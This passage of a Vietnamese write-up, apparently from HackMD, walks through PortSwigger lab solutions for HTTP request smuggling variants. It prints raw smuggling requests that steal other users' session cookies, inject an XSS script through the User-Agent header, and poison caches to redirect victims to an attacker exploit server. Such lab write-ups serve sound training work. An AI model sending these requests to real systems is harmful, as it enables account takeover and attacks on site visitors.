Content-Type: application/x-www-form-urlencoded
Content-Length: 500

search=


```
![image](https://hackmd.io/_uploads/BJMZwnmdR.png)

>Thành công xóa người dùng `carlos`, hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/ByfXDhQdR.png)

### **9. Lab: Exploiting HTTP request smuggling to capture other users' requests**
![image](https://hackmd.io/_uploads/ByJt62XdR.png)

>Bằng payload như lab 8, ta xác định được lab này thuộc dạng `CL.TE`:
>![image](https://hackmd.io/_uploads/rk4GypXdC.png)

>Trang web có chức năng comment, thử comment hợp lệ:
>![image](https://hackmd.io/_uploads/HJFUJ6QuR.png)
>![image](https://hackmd.io/_uploads/BkDc1pmuR.png)

>Ta sẽ sử dụng HTTP request smuggling tại tham số `comment`. Setup giá trị `comment` rỗng:
```
POST / HTTP/1.1
Host: 0ab7008f042ed2da85068a15001f006e.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 257
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 950
Cookie: session=4Y2ExAWPnueCvqOXTtV4mMZMkfFfK0Nb

csrf=1OqlRu6xzqrZ88TmL1G5BjAgBJiqcfp1&postId=5&name=ducanh&email=ducanh%40gmail-com&website=&comment=


```
![image](https://hackmd.io/_uploads/rJg9G6mOR.png)

>Lúc này, ta khai báo `Content-Length: 950` > kích thước body của attack request mới có `101`, cho nên back-end server sẽ chờ đợi data gửi đến sao cho đúng kích thước. Lúc này, request của người dùng khác được gửi đi, sẽ vô tình nối vào sau `comment` và server sẽ render phần comment của ta, vô tình làm lộ request gồm thông ti cookie của người dùng khác!: 
>![image](https://hackmd.io/_uploads/rkwh6pQdA.png)

>Thêm cookie vào request, ta truy cập được vào tài khoản admin:
>![image](https://hackmd.io/_uploads/H1PMRp7_C.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/H1UmC6QOA.png)


### **10. Lab: Exploiting HTTP request smuggling to deliver reflected XSS**
![image](https://hackmd.io/_uploads/B1hOvamdR.png)

>Như lab trước, lab này có chức năng comment ở mỗi bài lab, thử comment hợp lệ:
>![image](https://hackmd.io/_uploads/S1pquTmOC.png)
![image](https://hackmd.io/_uploads/Hkbhd6Qd0.png)

>Nhưng khác lab trước, bài này thêm cả giá trị của header `User-Agent` vào phần body của request khi post comment!

>Xem lại form comment thì thấy 1 hidden value `name="userAgent"` lấy giá trị từ header `User-Agent`:
>![image](https://hackmd.io/_uploads/r1gDKT7dR.png)

>Và không có bất kì 1 cơ chế validate nào cho giá trị này! Ta có thể thay đổi giá trị này thành XSS payload:
>![image](https://hackmd.io/_uploads/HyshcaX_A.png)

>Kiểm tra và thấy lab này thuộc dạng `CL.TE`:
>![image](https://hackmd.io/_uploads/ryjf9aXdR.png)

>Từ đó, xây dựng payload để trigger XSS:
```
POST / HTTP/1.1
Host: 0aed008404a116dd8184162200b000b7.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 148
Transfer-Encoding: chunked

0

GET /post?postId=8 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

a


```


>Trigger alert thành công!
>![image](https://hackmd.io/_uploads/Sy7FipmuR.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/rkJqspXu0.png)

### **11. Lab: Response queue poisoning via H2.TE request smuggling**
![image](https://hackmd.io/_uploads/SkKPZfI_C.png)

>Send một complete request với đường dẫn không tồn tại thành công với chunked encoding => bài lab thuộc dạng `H2.TE`:
```
POST / HTTP/2
Host: 0aae00ec0445139b8823cd94004b0050.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 85
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: 0aae00ec0445139b8823cd94004b0050.web-security-academy.net


```
![image](https://hackmd.io/_uploads/rymF-zU_R.png)

>Send request để poison response queue. Send liên tục cho đến khi nhận được response 302 chứa cookie=> đây là response sau khi admin đăng nhập thành công:
>![image](https://hackmd.io/_uploads/BkrKMz8dA.png)

>Thêm cookie vào request. Thử từng cookie và send liên tục cho tới khi nhận được cookie đúng của admin khi truy cập!

>Sau khi thử tầm 2 phút thì ta đã lấy thành công cookie của admin và truy cập được vào `/admin`:
>![image](https://hackmd.io/_uploads/B1kJmMUdR.png)

>Lấy đường dẫn xóa `carlos` và send request:
>![image](https://hackmd.io/_uploads/Hksl7zU_0.png)

>Xóa `carlos` thành công, hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/BygGmMI_0.png)

### **12. Lab: H2.CL request smuggling**
![image](https://hackmd.io/_uploads/SJ4RvlI_0.png)

>Ta thử send request  body tùy ý, kèm theo header `Content-Length: 0`. Sau khi gửi 2 lần thì respone "404 Not Found" Tấn công thành công dạng H2.CL:
>![image](https://hackmd.io/_uploads/S1MQM-LdA.png)

>Tiếp theo, mỗi lần load trang chủ `/`, trang web sẽ tìm nạp 1 số tài nguyên khác tại endpoint `/resources/....`:
>![image](https://hackmd.io/_uploads/B1e_XWL_R.png)

>Thử request tới `/resources`, ta sẽ đươck redirect về `https://domain-web/resources/`:
>![image](https://hackmd.io/_uploads/SJRomWUuA.png)

>Điều này làm ta liên tưởng tới lỗ hổng Host Header, bằng cách thay đổi giá trị host và tạo đường dẫn `/resources` chứa mã độc mà ta lưu trữ trước, và tấn công dạng `H2.CL`, victim khi load trang chủ sẽ bị redirect về server chứa mã độc của ta!!

>Thật vậy, kiểm chứng bằng cách inject 1 Host bất kì với header `Content-Length=10` dài hơn 1 chút so với phần body 1 kí tự `a`, để khi ghép với request phía sau sẽ cắt bớt phần header của rq sau => dẫn tới việc ko bị xung đột duplicate:
>![image](https://hackmd.io/_uploads/SyQPr-UOR.png)

>Sau khi gửi request 2 lần thì server sẽ redirect ta về `https://abc.com/resources/` mà ta mong muốn!

>Lưu payload vào exploit server:
>![image](https://hackmd.io/_uploads/ryS7DbIOA.png)

>Và thay đổi hot thành expoit server:
>![image](https://hackmd.io/_uploads/Sk2_Db8_0.png)

>Send request thì thấy đã có victim bị chuyển hướng vào, chứng tỏ payload hoạt động tốt!!
>![image](https://hackmd.io/_uploads/SJSN2WLu0.png)
```
POST / HTTP/2
Host: 0af000470400067c845900ff0057005c.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 0
Content-Type: application/x-www-form-urlencoded

GET /resources HTTP/1.1
Host: exploit-0a3d00d0044f064483dfffeb012400f5.exploit-server.net
Content-Length: 10

x=1
```

>Gửi request lặp lại cho tới khi nào solved bài lab! Do cần phải nối request theo sau đúng thời điểm victim truy cập. Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/B1Ns2-Id0.png)

### **13. Lab: HTTP/2 request smuggling via CRLF injection**
![image](https://hackmd.io/_uploads/SyQjKMIOA.png)

>Test xem trang web có dính lỗi `H2.CL` hay `H2.TE` hay không thì đều không có gì:
>![image](https://hackmd.io/_uploads/rkaDoGUOR.png)

>Thay vào đó, ở chức năng Search, trang web sẽ hiển thị lịch sử những từ khóa đã search trước đó: 
>![image](https://hackmd.io/_uploads/HyU2jM8dA.png)

>Xem lại request khi thực hiện tìm kiếm, request gửi đi tham số `search`:
>![image](https://hackmd.io/_uploads/Bk7f3fL_A.png)

>Khi thêm header `Transfer-Encoding: chunked` thì bị chặn: 
>![image](https://hackmd.io/_uploads/HJylCf8uC.png)

>Ta sẽ thực hiện CLRF injection tại 1 header bất kì để khi downgrade từ HTTP/2 xuống HTTP/1,  sẽ xuất hiện header TE và gửi cho back-end. Vào inspector và ấn `SHIFT+ENTER` để inject CLRF: 
>![image](https://hackmd.io/_uploads/SJts6MUuC.png)


>Gửi request smuggling với giá trị `search` để rỗng để capture request của user victim. Ngoài ra cần set session cookie hiện tại vì ta cần xem history search theo session:
>![image](https://hackmd.io/_uploads/HJ1w6VIO0.png)

>Send liên tục cho tới khi victim truy cập, lúc đó ta sẽ lấy được session của victim: ![image](https://hackmd.io/_uploads/rkWAp4UOC.png)

>Truy cập trang chủ bằng cookie victim:
>![image](https://hackmd.io/_uploads/SyzV0N8d0.png)

>Thành công và ta hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/BJTIAVU_A.png)

### **14. Lab: HTTP/2 request splitting via CRLF injection**
![image](https://hackmd.io/_uploads/ryXdrSIOA.png)

>Ở bài này, ta thực hiện CLRF injection tại header để splitting 1 request => poison response queue:
>![image](https://hackmd.io/_uploads/HJFYBrL_A.png)

>Send request ta nhận được respone `/404` do tài nguyên yêu cầu `GET /test` không tồn tại, chứng tỏ ta thành công poison!
>![image](https://hackmd.io/_uploads/Bk6CSr8OC.png)

>Tiếp tục send cho tới khi `302` là thời điểm admin đăng nhập và xuất hiện session:
>![image](https://hackmd.io/_uploads/BJzMLr8_R.png)

>Lấy được session của admin, ta thành công truy cập được vào tài khoản của admin:
>![image](https://hackmd.io/_uploads/rkEIIr8dA.png)

>Truy cập vào trang quản trị tại `/admin`:
>![image](https://hackmd.io/_uploads/SkaPLSI_R.png)

>Xóa `carlos`:
>![image](https://hackmd.io/_uploads/HkhYUBI_C.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/SkF9UH8dA.png)

### **15. Lab: CL.0 request smuggling**
![image](https://hackmd.io/_uploads/BJok1IUu0.png)

>Tại request load các resources bị smuggled khi thêm body và update giá trị cho `Content-Length`:
>![image](https://hackmd.io/_uploads/SJaqXLUdC.png)

>Cụ thể, bên phía front-end server hỗ trợ header `Content-Length` và lấy cả phần body `abc`  forward request  sang cho back-end server. Mà phía back-end lại không hỗ trợ header này, mặc định coi request kết thúc khi hết header, kết quả là phần `abc` sẽ bị thừa và bị hiểu sang 1 request mới => Back-end server ko chấp nhận request có method `abc` !!

>Lúc này, ta thay body thành request đến `/admin` và request smuggling này sẽ là prefix cho request sau:
```
POST /resources/images/blog.svg HTTP/2
Host: 0ae100300475816680aa7642001e00c1.web-security-academy.net
Cookie: session=j9LS0PGWX9Re6Li8CbJqxRHCnRHNfYHE
Content-Length: CORRECT

GET /admin HTTP/1.1
Foo: x
```
>![image](https://hackmd.io/_uploads/HJnm8LUOA.png)

>Thành công có thể truy cập vào được `/admin` !
>Xóa người dùng `carlos`:
>![image](https://hackmd.io/_uploads/rJ8PIUI_C.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/ryHOU8LuR.png)

### **16. Lab: Exploiting HTTP request smuggling to perform web cache poisoning**
![image](https://hackmd.io/_uploads/ryn4dLI_C.png)

>Đầu tiên, ta xác nhận lab này dính lỗi `CL.TE`:
>![image](https://hackmd.io/_uploads/r1RusULdA.png)

>Tiếp theo, khi load trang chủ `/` sẽ load file tại `/resources/js/tracking.js` và trong respone có sử dụng cache!
>![image](https://hackmd.io/_uploads/HJAniLIOC.png)

>Tại chức năng chuyển sang post kế tiếp "Next Post", có request đến `/post/next?postId=<ID>` và sau đó được redirect đến next post:
>![image](https://hackmd.io/_uploads/S1z4T8IdC.png)
![image](https://hackmd.io/_uploads/H1fPa8U_C.png)

>Smuggling với request `/post/next?postId=<ID>` bằng host bất kì thì thấy redirect về chính host ta controll với đường dẫn `/post`:
```
POST / HTTP/1.1
Host: 0a63002a0341ddf680c5dacf003800b4.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 134
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post/next?postId=2 HTTP/1.1
Host: abc.com
Content-Length: 10
Content-Type: application/x-www-form-urlencoded
Foo: x

a

```
>![image](https://hackmd.io/_uploads/SytbR8Iu0.png)

>Ta sẽ tạo payload XSS `alert(document.cookie)` tại đường dẫn `/post` của exploit-server
>![image](https://hackmd.io/_uploads/HJ7HRI8_R.png)

>Thay đổi `Host` sang exploit server. Send lại request 2 lần và đã redirect về exploit server thành công: 
```
POST / HTTP/1.1
Host: 0a63002a0341ddf680c5dacf003800b4.web-security-academy.net
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 186
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post/next?postId=2 HTTP/1.1
Host: exploit-0aee00390393ddd28049d95c016e00c4.exploit-server.net
Content-Length: 10
Content-Type: application/x-www-form-urlencoded
Foo: x

a

```
>![image](https://hackmd.io/_uploads/ry6TR8UuR.png)

>Xem lại log thì thấy victim đã bị chuyển hướng truy cập tới:
>![image](https://hackmd.io/_uploads/Bkg11vId0.png)

>Lúc này, import lại `tracking.js` thì thấy nó đã bị redirect về exploit server của ta (Do đường dẫn nextPost đã bị poison web cache):
>![image](https://hackmd.io/_uploads/ry2FGDU_0.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/H1zsMwLOA.png)

### **17. Lab: Exploiting HTTP request smuggling to perform web cache deception**
![image](https://hackmd.io/_uploads/S1fi7vUO0.png)

>Kiểm tra và phát hiện lab này dính lỗi `CL.TE`:
>![image](https://hackmd.io/_uploads/rkL_BDIOC.png)

>Như lab trước, request `GET /resources/js/tracking.js` sử dụng cache:
>![image](https://hackmd.io/_uploads/HJMgLwUuA.png)

>Đăng nhập vào tài khoản được cấp `wiener`, tại `/my-account` hiển thị API KEY tương ứng của user:
>![image](https://hackmd.io/_uploads/r1ym8wIOC.png)

>Ta gửi request tấn công smuggling với request đến `/my-account`:
>![image](https://hackmd.io/_uploads/S1G3xdIuR.png)

>Gửi liên tục vài lần, lấy session cuối cùng:
>![image](https://hackmd.io/_uploads/r1vdedUd0.png)

>Tại request `GET /resources/js/tracking.js`, thêm cookie tìm được ở trên, send request và thấy được nó đã được chuyển hướng sang `/my-account` do web cache server đã bị đánh lừa:
>![image](https://hackmd.io/_uploads/SkSXW_8OA.png)

>Tìm kiếm theo từ khóa **"api"** thì ta lấy được API KEY của admin:
>![image](https://hackmd.io/_uploads/Bkg8bOIuR.png)

>Submit và ta hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/rJfwZdIuA.png)

